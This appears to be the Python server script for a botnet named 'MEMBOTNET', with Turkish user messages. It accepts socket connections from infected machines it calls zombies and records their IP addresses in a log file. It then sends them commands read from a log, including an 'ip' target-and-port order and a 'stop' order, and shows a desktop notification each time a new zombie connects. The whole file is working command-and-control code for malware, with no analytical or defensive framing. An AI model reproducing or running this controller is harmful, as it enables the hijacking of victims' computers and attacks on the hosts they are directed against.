import socket
import json
import sys
import os
import colorama
try:
    import win10toast
except ImportError:
    print('"win10toast" Bulunamadı! lütfen terminala "pip install win10toast" yaz!')
    sys.exit()
from win10toast import ToastNotifier
from colorama import Fore, init
file = sys.argv[0]
current_path = os.path.dirname(file)
current_path = current_path.replace("/server", "")
print(current_path)
toast = ToastNotifier()
init()
if len(sys.argv) < 3:
    sys.exit()

try:
    if os.path.exists(current_path+'/zombies/zm.log'):
        pass
    else:
        with open(current_path+'/zombies/zm.log', 'w') as g:
            g.close()
except:
    pass
local = sys.argv[1]
listen_port = int(sys.argv[2])
try:
    if os.path.exists(current_path+'/server/cmd.log'):
        os.remove(current_path+'/server/cmd.log')
    else:
        pass
except:
    pass
def listen_loop():
    while True:
        def cmd_send(data):
            jsondata = json.dumps(data)
            target.send(jsondata.encode())
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((local, listen_port))
        server.listen(5)
        target, ip = server.accept()
        try:
            with open(current_path+'/server/cmd.log', 'r') as f:
                log = f.read()
            if "ip" in log:
                s = log.split()
                cmd_send(f"ip {s[1]} {s[2]}")
        except:
            pass
        try:
            with open(current_path+'/server/cmd.log', 'r') as f:
                log = f.read()
            if "stop" in log:
                cmd_send("stop")
        except:
            pass
        try:
            with open(current_path+'/zombies/zm.log', 'a') as f:
                f.write(str(ip)+'\n')
        except:
            pass
        toast.show_toast(f"MEMBOTNET", f"Sunucu: {local}, Yeni zombi bağlandı!, IP adres: {str(ip)}",duration=6,icon_path=current_path+'/icons/ninja_icon.ico')

listen_loop()